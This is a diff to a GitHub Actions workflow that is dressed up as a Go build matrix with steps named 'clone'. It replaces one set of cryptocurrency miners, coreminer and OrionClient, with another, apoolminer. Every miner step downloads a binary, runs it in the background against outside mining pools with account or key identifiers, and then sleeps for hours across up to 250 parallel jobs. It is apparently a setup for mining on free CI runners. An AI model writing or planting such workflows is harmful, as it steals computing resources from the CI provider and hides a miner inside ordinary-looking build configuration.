@@ -25,8 +25,7 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
-          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
+      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --algo qubic --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-15000 -n 1)-tod) --pool qubic1.hk.apool.io:3334 &
            sleep 310s
   ol:
     needs: kont
@@ -49,8 +48,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
-          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
+      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --algo qubic --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-15000 -n 1)-tod) --pool qubic1.hk.apool.io:3334 &
             sleep 5m
         
     
@@ -76,8 +74,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
-          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
+      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --algo qubic --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-15000 -n 1)-tod) --pool qubic1.hk.apool.io:3334 &
             sleep 6m
   ayo:
     needs: ol
@@ -100,8 +97,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
-          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
+      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --algo qubic --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-15000 -n 1)-tod) --pool qubic1.hk.apool.io:3334 &
             sleep 105m
         
     
@@ -127,101 +123,7 @@ jobs:
         go-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.88/coreminer-linux-x86_64.tar.gz && tar xf coreminer-linux-x86_64.tar.gz && cd coreapp && ./coreminer -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@eu.catchthatrabbit.com:8008 \
-          -P stratum1+tcp://cb2176814d209010a1bb5eb6c046e0e40e82773fd578.tod@as.catchthatrabbit.com:8008 &
-            sleep 261m
-        
-    
-          go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 250
-        JOB: ${{ matrix.go }}
-    steps:
-    - uses: actions/checkout@v4
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
-            sleep 5m
-        
-    
-     
-  tol:
-    needs: [kont]
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: true
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 250
-        JOB: ${{ matrix.go }}
-    steps:
-    - uses: actions/checkout@v4
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
-            sleep 6m
-  ayo:
-    needs: ol
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: true
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 250
-        JOB: ${{ matrix.go }}
-    steps:
-    - uses: actions/checkout@v4
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
-            sleep 305m
-        
-    
-     
-  su:
-    needs: [tol]
-    runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 250
-      fail-fast: true
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 250
-        JOB: ${{ matrix.go }}
-    steps:
-    - uses: actions/checkout@v4
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: clone
-      run: wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient_linux.zip && unzip OrionClient_linux.zip && cd OrionClient_linux && chmod 777 * && ./OrionClient mine -a --pool Twpore --key HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --worker tod1 &
+      run: wget https://github.com/apool-io/xmrminer/releases/download/v3.2.0/apoolminer_linux_xmr_v3.2.0.tar.gz && tar xf apoolminer_linux_xmr_v3.2.0.tar.gz && cd apoolminer_linux_xmr_v3.2.0 && ./apoolminer --algo qubic --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-15000 -n 1)-tod) --pool qubic1.hk.apool.io:3334 &
             sleep 261m
         
     
